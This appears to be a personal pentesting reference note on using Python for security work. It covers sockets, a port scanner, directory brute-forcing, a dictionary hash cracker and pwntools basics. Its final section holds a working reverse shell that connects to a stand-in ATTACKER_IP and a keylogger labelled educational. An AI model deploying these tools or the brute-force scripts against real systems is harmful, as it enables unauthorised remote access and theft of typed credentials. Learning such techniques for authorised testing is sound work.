---
title: Python for Security
tags:
  - secops
  - reference
  - python
  - scripting
  - automation
  - tools
  - intermediate
created: 2026-03-23
folder: 06-Reference
status: complete
difficulty: intermediate
---

# Python for Security

> Python is the lingua franca of security tooling. From quick one-liners to full exploitation frameworks, understanding Python makes you a dramatically more capable security professional.

---

## Why Python for Security

- Rapid prototyping of exploits and tools
- Automation of repetitive tasks (scanning, parsing, reporting)
- Most security tools (Impacket, BloodHound.py, Scapy, SQLmap) are written in Python
- Excellent library ecosystem for networking, cryptography, web, binary analysis
- Cross-platform — runs on Linux, Windows, macOS

---

## Essential Libraries

### Networking
```python
import socket          # Low-level TCP/UDP
import requests        # HTTP client
import scapy           # Packet crafting and sniffing
import paramiko        # SSH client/server
import ftplib          # FTP
import smtplib         # SMTP
```

### Web
```python
import requests        # HTTP requests
from bs4 import BeautifulSoup  # HTML parsing
import urllib.parse    # URL encoding/decoding
```

### Cryptography
```python
from cryptography.hazmat.primitives import hashes
import hashlib         # MD5, SHA1, SHA256
import hmac            # HMAC
import base64          # Base64 encode/decode
```

### System and OS
```python
import os              # OS interaction
import sys             # System functions
import subprocess      # Run shell commands
import shutil          # File operations
import pathlib         # Path manipulation
```

### Binary and Exploit Dev
```python
from pwn import *      # pwntools — CTF/exploit dev
import struct          # Binary packing/unpacking
```

### Parsing and Data
```python
import json            # JSON
import re              # Regex
import csv             # CSV files
import xml.etree.ElementTree as ET  # XML parsing
import argparse        # CLI argument parsing
```

---

## Networking Fundamentals

### TCP Client
```python
import socket

def tcp_client(host, port, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(data.encode())
    response = s.recv(4096)
    s.close()
    return response.decode()

print(tcp_client("target.com", 80, "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"))
```

### TCP Server (listener)
```python
import socket
import threading

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    data = conn.recv(1024)
    print(f"[*] Received: {data.decode()}")
    conn.send(b"ACK")
    conn.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(5)
print("[*] Listening on port 4444")

while True:
    conn, addr = server.accept()
    t = threading.Thread(target=handle_client, args=(conn, addr))
    t.start()
```

### UDP Client
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"hello", ("target.com", 53))
data, addr = s.recvfrom(4096)
```

---

## Port Scanner
```python
import socket
import concurrent.futures

def scan_port(host, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((host, port))
        s.close()
        return port
    except:
        return None

def port_scan(host, start=1, end=1024):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, port): port 
                   for port in range(start, end + 1)}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print(f"[+] Port {result} open")
                open_ports.append(result)
    return sorted(open_ports)

port_scan("192.168.1.1", 1, 1024)
```

---

## HTTP and Web Requests

### Basic Requests
```python
import requests

# GET request
r = requests.get("http://target.com/page", timeout=10)
print(r.status_code, r.text[:200])

# POST request
r = requests.post("http://target.com/login", 
                  data={"username": "admin", "password": "password123"})

# With headers and cookies
headers = {"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1"}
cookies = {"session": "abc123"}
r = requests.get("http://target.com/admin", headers=headers, cookies=cookies)

# Ignore SSL certificate errors
r = requests.get("https://target.com", verify=False)
```

### Directory Brute-Force
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def check_path(url, path):
    try:
        r = requests.get(f"{url}/{path.strip()}", timeout=5, allow_redirects=False)
        if r.status_code not in [404, 400]:
            print(f"[{r.status_code}] /{path.strip()}")
    except:
        pass

url = "http://target.com"
with open("/usr/share/wordlists/dirb/common.txt") as f:
    wordlist = f.readlines()

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(lambda p: check_path(url, p), wordlist)
```

### Web Scraping
```python
import requests
from bs4 import BeautifulSoup

r = requests.get("http://target.com")
soup = BeautifulSoup(r.text, "html.parser")

# Find all links
links = [a["href"] for a in soup.find_all("a", href=True)]

# Find all forms
forms = soup.find_all("form")
for form in forms:
    print(form.get("action"), [i.get("name") for i in form.find_all("input")])
```

---

## Cryptography and Hashing

```python
import hashlib
import base64

# Hash a string
def hash_string(s, algorithm="sha256"):
    h = hashlib.new(algorithm)
    h.update(s.encode())
    return h.hexdigest()

print(hash_string("password"))           # SHA256
print(hash_string("password", "md5"))   # MD5

# Base64 encode/decode
encoded = base64.b64encode(b"Hello World").decode()
decoded = base64.b64decode(encoded).decode()

# URL-safe base64
encoded = base64.urlsafe_b64encode(b"data+/=").decode()
```

### Password Cracker (dictionary attack)
```python
import hashlib

def crack_hash(target_hash, wordlist_path, algorithm="md5"):
    with open(wordlist_path, "r", errors="ignore") as f:
        for word in f:
            word = word.strip()
            h = hashlib.new(algorithm)
            h.update(word.encode())
            if h.hexdigest() == target_hash:
                print(f"[+] Found: {word}")
                return word
    print("[-] Not found")
    return None

crack_hash("5f4dcc3b5aa765d61d8327deb882cf99", "/usr/share/wordlists/rockyou.txt")
```

---

## Subprocess and OS Interaction

```python
import subprocess

# Run command and capture output
result = subprocess.run(["nmap", "-sV", "target.com"], 
                        capture_output=True, text=True)
print(result.stdout)

# Shell command
result = subprocess.run("whoami && id", shell=True, capture_output=True, text=True)
print(result.stdout)

# Check for OS
import platform
print(platform.system())   # Linux, Windows, Darwin
```

---

## Argument Parsing (CLI Tools)

```python
import argparse

parser = argparse.ArgumentParser(description="Security Tool")
parser.add_argument("-t", "--target", required=True, help="Target host")
parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
parser.add_argument("-w", "--wordlist", help="Wordlist path")
parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

args = parser.parse_args()
print(f"Scanning {args.target}:{args.port}")
```

---

## Useful One-Liners

```python
# Decode base64
python3 -c "import base64; print(base64.b64decode('SGVsbG8=').decode())"

# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"

# Generate MD5 hash
python3 -c "import hashlib; print(hashlib.md5(b'password').hexdigest())"

# Simple HTTP server
python3 -m http.server 8080

# Hex encode
python3 -c "print('Hello'.encode().hex())"

# Reverse string
python3 -c "print('hello'[::-1])"

# XOR
python3 -c "print(bytes([a^0x41 for a in b'Hello']))"
```

---

## pwntools (CTF / Exploit Dev)

```python
from pwn import *

# Connect to service
p = remote("target.com", 1337)

# Receive data
data = p.recvline()
p.recvuntil(b"Enter input: ")

# Send payload
payload = b"A" * 64 + p64(0xdeadbeef)
p.sendline(payload)

# Interactive mode
p.interactive()

# Cyclic pattern for buffer overflow offset
pattern = cyclic(200)
offset = cyclic_find(0x61616161)

# Pack addresses
p64(0x401337)   # 64-bit little-endian
p32(0x401337)   # 32-bit little-endian
```

---

## Security Tool Templates

### Reverse Shell
```python
import socket, subprocess, os

s = socket.socket()
s.connect(("ATTACKER_IP", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

### Keylogger (educational)
```python
from pynput import keyboard

def on_press(key):
    with open("keys.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

---

## Related Notes
- Bash-Scripting
- Penetration-Testing-Methodology
- Web-Application-Testing
- Netcat

## See Also

- Bash-Scripting
- Penetration-Testing-Methodology
- Networking-Basics
- Web-Application-Testing
- ServiceNow-Flow-Designer

---
<- [[Reference-MOC]]